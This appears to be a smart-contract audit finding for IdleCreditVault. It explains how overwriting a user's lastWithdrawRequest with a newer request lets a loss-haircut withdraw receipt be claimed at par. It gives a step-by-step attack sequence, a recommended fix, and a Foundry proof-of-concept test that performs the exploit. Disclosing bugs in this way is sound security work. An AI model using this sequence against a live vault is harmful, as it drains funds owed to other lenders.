### Title
Loss-adjusted withdraw receipts can be claimed at par after `lastWithdrawRequest` is overwritten by a newer request — (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
The external bug class is an attacker-controlled value injected into a backend query so that a security-relevant lookup returns the wrong row. The analog here is `lastWithdrawRequest[_user]`: `IdleCreditVault` stores only a single "latest request epoch" per user and uses it as the lookup key into `lossRecoveryPriceByEpoch`. By making a new `requestWithdraw` in a later epoch, an attacker-controlled user-controlled input overwrites that key, causing `_claimLossAdjustedWithdrawRequest` to miss the stored haircut price, after which `_claimFundedWithdrawRequest` pays the user's *entire* aggregated `withdrawsRequests` basis at par — silently bypassing the loss that `collectWithdrawFunds` assigned to pending receipts.

### Finding Description
When a stop epoch realizes a loss, `collectWithdrawFunds` is called with `_amount < pendingBasis`. In the loss branch it stores `lossRecoveryPriceByEpoch[epochNumber] = _amount * RECOVERY_FULL / pendingBasis`, zeroes the **global** `pendingWithdraws`, and pulls only the haircutted `_amount` of underlying into the strategy (`contracts/strategies/idle/IdleCreditVault.sol:411-430`). Critically, **per-user `withdrawsRequests[_user]` and `withdrawsRequestsByEpoch[_user][epoch]` are left holding the full unhaircutted basis**, by design — the haircut is meant to be applied at claim time in `_claimLossAdjustedWithdrawRequest`:

```solidity
uint256 lossEpoch = lastWithdrawRequest[_user];
uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
if (lossRecoveryPrice == 0) return amount;   // line 789-792
amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
_transferFundedClaim(_user, amount);          // line 799-800
```

The keyed lookup uses `lastWithdrawRequest[_user]`, but `requestWithdraw` unconditionally overwrites it: `lastWithdrawRequest[_user] = currentEpoch;` (line 282). In `claimWithdrawRequest` (lines 301-314), the paths are tried in order — post-default, defaulted-epoch, loss-adjusted, then funded:

```solidity
amount += _claimLossAdjustedWithdrawRequest(_user);
return amount + _claimFundedWithdrawRequest(_user);
```

`_claimFundedWithdrawRequest` (lines 319-349) pays `withdrawsRequests[_user]` (plus APR0 buckets) at par with no haircut and clears it, gated only by `epochNumber > lastWithdrawRequest[_user]`.

Attack sequence (running epoch, normal mode):

1. Attacker deposits, requests a withdraw of amount X in epoch E. Epoch E stops with a loss; `collectWithdrawFunds` funds only `X * price` and stores `lossRecoveryPriceByEpoch[E] = price < RECOVERY_FULL`.
2. Before claiming, attacker deposits again (or uses remaining tranche balance) and calls `requestWithdraw` in epoch E+1. This sets `lastWithdrawRequest[attacker] = E+1`.
3. Epoch E+1 stops normally; `lossRecoveryPriceByEpoch[E+1] == 0`.
4. Attacker calls `claimWithdrawRequest`: `_claimLossAdjustedWithdrawRequest` looks up epoch E+1, sees price 0, returns 0 **without clearing** the epoch-E receipt. `_claimFundedWithdrawRequest` then sees `epochNumber (E+2) > lastWithdrawRequest (E+1)`, so it pays `withdrawsRequests[attacker] = X (full basis) + newRequest` at par.

The attacker receives the unhaircutted X even though the strategy only holds `X * price` for epoch-E receipts. The excess `(1 - price) * X` is drained from funded claims belonging to other receipt holders of epoch E (or from recovery/funded reserves), breaking the "one receipt, one haircutted payout" invariant and the loss-socialization invariant that `previewLossAdjustedWithdrawFunds`/`collectWithdrawFunds` are designed to enforce.

The existing guards do not stop this: the `epochNumber <= lastWithdrawRequest` check (line 326) is satisfied after one more epoch; `lossRecoveryPriceByEpoch[E]` still exists but is simply never reached because the lookup key was overwritten; nothing links `withdrawsRequestsByEpoch[user][E]` to the stored price at claim time.

### Impact Explanation
Direct theft with quantified loss. For every loss-adjusted epoch, an attacker can convert a haircutted receipt worth `basis * price / RECOVERY_FULL` into a full par payout of `basis`, extracting `basis * (1 - price/RECOVERY_FULL)` from the strategy's funded-claims balance. This either leaves honest receipt holders of the same epoch undercollateralized (last claimants' transfers fail or they are paid from funds meant for others) or draws down reserves, i.e., direct theft of other users' unclaimed yield with losses bounded only by the size of the attacker's receipt and `1 - price` (up to ~100% when price is near the `lossRecoveryPrice == 0` revert boundary).

### Likelihood Explanation
High feasibility for any KYC-passing lender: it requires only ordinary, permissionless actions — `requestWithdraw`, wait, `requestWithdraw` again (a tiny second deposit suffices), `claimWithdrawRequest`. No privileged role, no borrower default, no timing race beyond spanning two epochs. The only prerequisite is a `stopEpochWithDuration` loss epoch, which is a normal manager operation. The overwrite path in `requestWithdraw` is on the default flow, not an edge case.

### Recommendation
Do not rely on the single mutable `lastWithdrawRequest[_user]` as the loss-price lookup key. Iterate the user's request epochs (or store per-epoch receipt settlement state) so that `_claimLossAdjustedWithdrawRequest` checks `lossRecoveryPriceByEpoch` for **every** epoch in which the user has `withdrawsRequestsByEpoch`/`apr0Users` entries — e.g., check each non-zero epoch bucket for a non-zero `lossRecoveryPriceByEpoch` before falling through to `_claimFundedWithdrawRequest`, or track a `firstUnclaimedEpoch`/set of epochs per user. Additionally, when a new `requestWithdraw` is made while an unclaimed loss-adjusted receipt exists, either force-claim the old receipt first or preserve the prior epoch key.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCDOEpochVariant} from "../../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVault} from "../../contracts/strategies/idle/IdleCreditVault.sol";
import {IERC20Detailed} from "../../contracts/interfaces/IERC20Detailed.sol";

// Setup mirrors test/foundry/IdleCreditVault.t.sol helpers:
// _depositWithUser(user, amount), _startEpochAndCheckPrices, manager, borrower, underlying.
contract LossReceiptParClaimPoC is Test {
    // Attacker: KYC-passed lender with AA tranches.

    function testLossReceiptClaimedAtPar() external {
        // --- epoch E: deposit + withdraw request ---
        uint256 amount = 100_000 * 1e6;
        _depositWithUser(attacker, amount);
        vm.prank(attacker);
        uint256 basisE = cdoEpoch.requestWithdraw(0, AA); // full balance

        // stop epoch E with a realized loss, e.g. 50% of total basis
        IdleCreditVault vault = IdleCreditVault(strategy);
        uint256 pendingBasis = vault.pendingWithdraws();
        uint256 activeBasis = cdoEpoch.getContractValue() + cdoEpoch.expectedEpochInterest();
        uint256 lossAmount = (activeBasis + pendingBasis) / 2; // 50% loss
        (uint256 pendingToFund,) = vault.previewLossAdjustedWithdrawFunds(lossAmount);
        // borrower repays interest + pendingToFund (honest borrower)
        uint256 repay = cdoEpoch.expectedEpochInterest() + pendingToFund;
        deal(underlying, borrower, repay);
        vm.prank(borrower);
        IERC20Detailed(underlying).approve(address(cdoEpoch), repay);
        vm.warp(cdoEpoch.epochEndDate() + 1);
        vm.prank(manager);
        cdoEpoch.stopEpochWithDuration(0, cdoEpoch.expectedEpochInterest(), cdoEpoch.epochDuration(), lossAmount);

        uint256 price = vault.lossRecoveryPriceByEpoch(vault.epochNumber());
        assertGt(price, 0);
        assertLt(price, 1e18); // haircut applied

        // --- epoch E+1: attacker makes a dust deposit + new request, overwriting lastWithdrawRequest ---
        _depositWithUser(attacker, 1e6); // dust
        vm.prank(attacker);
        cdoEpoch.requestWithdraw(0, AA); // lastWithdrawRequest[attacker] = E+1

        // start + stop epoch E+1 normally (no loss)
        vm.prank(manager);
        cdoEpoch.startEpoch();
        vm.warp(cdoEpoch.epochEndDate() + 1);
        // borrower repays honestly for epoch E+1
        uint256 repay2 = cdoEpoch.expectedEpochInterest() + vault.pendingWithdraws();
        deal(underlying, borrower, repay2);
        vm.prank(borrower);
        IERC20Detailed(underlying).approve(address(cdoEpoch), repay2);
        vm.prank(manager);
        cdoEpoch.stopEpoch(0, 0);

        // --- claim: loss-adjusted path misses (key = E+1), funded path pays at par ---
        uint256 balPre = IERC20Detailed(underlying).balanceOf(attacker);
        vm.prank(attacker);
        cdoEpoch.claimWithdrawRequest();
        uint256 claimed = IERC20Detailed(underlying).balanceOf(attacker) - balPre;

        // Attacker got full basisE at par instead of basisE * price / 1e18
        uint256 haircutted = basisE * price / 1e18;
        assertGt(claimed, haircutted); // excess = basisE * (1e18 - price) / 1e18 stolen
        assertApproxEqAbs(claimed, basisE /* + dust receipt */, 2, "paid at par, haircut bypassed");
    }
}
```
